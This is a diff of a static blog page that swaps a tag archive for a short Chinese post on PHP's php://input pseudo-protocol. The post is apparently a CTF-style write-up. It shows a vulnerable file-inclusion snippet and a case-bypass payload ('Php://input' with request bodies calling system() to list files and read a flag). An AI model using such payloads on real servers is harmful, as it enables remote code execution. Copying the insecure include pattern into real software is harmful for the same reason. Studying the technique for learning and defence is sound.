@@ -4,16 +4,21 @@
   <meta charset="utf-8">
   
   
-  <title>标签: 信息收集 | Traveler2000🪐</title>
+  <title>PHP 伪协议之 php://input | Traveler2000🪐</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="网络安全菜鸟，大佬们见笑了">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Traveler2000🪐">
-<meta property="og:url" content="http://traveler2000.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
+  <meta name="description" content="12345678&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file &#x3D; $_GET[&#x27;file&#x27;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    high">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP 伪协议之 php:&#x2F;&#x2F;input">
+<meta property="og:url" content="http://traveler2000.github.io/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/index.html">
 <meta property="og:site_name" content="Traveler2000🪐">
-<meta property="og:description" content="网络安全菜鸟，大佬们见笑了">
+<meta property="og:description" content="12345678&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file &#x3D; $_GET[&#x27;file&#x27;];    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    high">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-04-15T12:17:14.055Z">
+<meta property="article:modified_time" content="2025-04-15T12:18:22.475Z">
 <meta property="article:author" content="Traveler2000">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="文件包含">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="/atom.xml" title="Traveler2000🪐" type="application/atom+xml">
@@ -71,39 +76,71 @@
 </header>
 
       <div class="outer">
-        <section id="main">
-  
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2025" class="archive-year">2025</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2025/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="archive-article-date">
-  <time class="dt-published" datetime="2025-04-13T10:40:23.150Z" itemprop="datePublished">4月 13</time>
+        <section id="main"><article id="post-php伪协议之input" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/" class="article-date">
+  <time class="dt-published" datetime="2025-04-15T12:17:14.055Z" itemprop="datePublished">2025-04-15</time>
 </a>
-      
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2025/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B0%8F%E6%8A%80%E5%B7%A7/">信息收集小技巧</a>
+    <h1 class="p-name article-title" itemprop="headline name">
+      PHP 伪协议之 php://input
     </h1>
   
 
-    </header>
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此处可大写绕过与 <code>php://input</code> 相结合。</p>
+<p>URL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=Php://input</span><br></pre></td></tr></table></figure>
+
+<p>请求体：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;ls&quot;);?&gt;//第一次请求</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;tac fla*&quot;);?&gt;//第二次请求</span><br></pre></td></tr></table></figure>
+
+<p>借此讲讲 <code>php://input</code> 怎么用。</p>
+<p><code>php://input</code> 是一个 PHP 内置的伪协议，<strong>用于读取 HTTP 请求中的原始数据</strong>。</p>
+<p>从超级全局变量 <strong><code>$_POST</code></strong> 数组读取的是处理过的、作为一个个元素的参数。当需要<strong>读取 POST 原始数据</strong>时，通常就会用到 <code>php://input</code> 伪协议来读取请求体。因为是直接读取请求体，所以 <strong>HTTP method 不是 POST 也能读取</strong>。</p>
+<p>所以，我们可以发送请求时抓包，然后修改请求体为 Payload ，并把 URL 中将要被文件包含的参数的值改为 <code>php://input</code> ，最后发包看看响应的效果。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://traveler2000.github.io/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/" data-id="cm9igy4ln00080suhg2ue91bu" data-title="PHP 伪协议之 php://input" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li></ul>
+
+    </footer>
   </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2025/04/15/%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">大小写绕过</div>
+    </a>
+  
+</nav>
+
+  
 </article>
-  
-  
-    </div></section>
-  
 
 
 </section>
